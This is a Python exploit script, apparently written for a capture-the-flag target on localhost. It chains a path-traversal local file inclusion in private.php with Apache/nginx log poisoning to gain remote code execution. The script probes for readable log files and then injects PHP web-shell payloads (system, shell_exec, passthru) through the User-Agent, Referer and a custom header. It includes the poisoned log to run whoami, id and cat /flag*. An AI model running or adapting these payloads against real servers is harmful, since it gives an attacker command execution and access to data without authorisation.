import requests
import re

TARGET = "http://127.0.0.1:33001"

print("="*80)
print("LOG POISONING TEST")
print("="*80)

# First, try to read the access log
log_paths = [
    "../../../var/log/apache2/access.log",
    "../../../var/log/apache2/error.log",
    "../../../var/log/httpd/access_log",
    "../../../var/log/httpd/error_log",
    "../../../var/log/apache2/other_vhosts_access.log",
    "../../../var/log/nginx/access.log",
    "../../../var/log/nginx/error.log",
    "../../../var/log/php_errors.log",
    "../../../var/log/apache2/access_log",
    "../../../proc/self/fd/2",  # stderr
    "../../../tmp/access.log",
]

base_url = f"{TARGET}/private.php"

print("\n[+] Testing log file access...\n")

baseline = requests.get(base_url, timeout=10)

for log_path in log_paths:
    url = f"{base_url}?file={log_path}"
    
    try:
        resp = requests.get(url, timeout=10)
        content_diff = len(resp.text) - len(baseline.text)
        
        # Clean the content
        text = re.sub(r'<[^>]+>', ' ', resp.text)
        text = re.sub(r'\s+', ' ', text).strip()
        
        # Check for log indicators
        if any(x in text for x in ["GET /", "POST /", "HTTP/1.1", "Mozilla", "private.php"]):
            print(f"\n[+] LOG FILE ACCESSIBLE: {log_path}")
            print(f"    Content diff: +{content_diff} bytes")
            
            # Extract log content
            log_match = re.search(r'Content of\s+\S+\s+(.*)', text, re.DOTALL)
            if log_match:
                log_content = log_match.group(1).strip()
                print(f"    Last 500 chars of log:")
                print(f"    {log_content[-500:]}")
            else:
                print(f"    Content: {text[:500]}")
                
    except Exception as e:
        pass

# Try poison the log with PHP code
print("\n" + "="*60)
print("ATTEMPTING LOG POISONING")
print("="*60)

# Send request with PHP code in User-Agent to poison the log
poison_headers = {
    'User-Agent': '<?php system($_GET["cmd"]); ?>',
    'X-Custom': '<?php echo shell_exec($_GET["cmd"]); ?>',
    'Referer': '<?php passthru($_GET["cmd"]); ?>'
}

print("\n[+] Sending poisoned request to access log...")
poison_resp = requests.get(TARGET, headers=poison_headers, timeout=10)
print(f"    Poison request status: {poison_resp.status_code}")

# Now try to include the log file with command execution
log_inclusion_paths = [
    "../../../var/log/apache2/access.log",
    "../../../var/log/apache2/other_vhosts_access.log", 
    "../../../var/log/httpd/access_log",
]

print("\n[+] Testing for RCE via log poisoning...")

for log_path in log_inclusion_paths:
    # Include log with cmd parameter
    url = f"{base_url}?file={log_path}&cmd=whoami"
    
    try:
        resp = requests.get(url, timeout=10)
        
        # Check for command output indicators
        text = re.sub(r'<[^>]+>', ' ', resp.text)
        text = re.sub(r'\s+', ' ', text).strip()
        
        if any(x in text for x in ["www-data", "root", "daemon", "apache", "uid="]):
            print(f"\n[!] RCE CONFIRMED via {log_path}")
            print(f"    Response: {text[:800]}")
            
    except Exception as e:
        pass

# Try with ID command
for log_path in log_inclusion_paths:
    url = f"{base_url}?file={log_path}&cmd=id"
    
    try:
        resp = requests.get(url, timeout=10)
        text = re.sub(r'<[^>]+>', ' ', resp.text)
        text = re.sub(r'\s+', ' ', text).strip()
        
        if "uid=" in text or "gid=" in text:
            print(f"\n[!] RCE CONFIRMED via {log_path}")
            print(f"    Response: {text[:800]}")
            
            # Try to get flag
            flag_resp = requests.get(f"{base_url}?file={log_path}&cmd=cat%20/flag*", timeout=10)
            flag_text = re.sub(r'<[^>]+>', ' ', flag_resp.text)
            flag_text = re.sub(r'\s+', ' ', flag_text).strip()
            print(f"\n[!] FLAG ATTEMPT: {flag_text[:500]}")
            
    except Exception as e:
        pass

print("\n[+] Log poisoning tests complete")
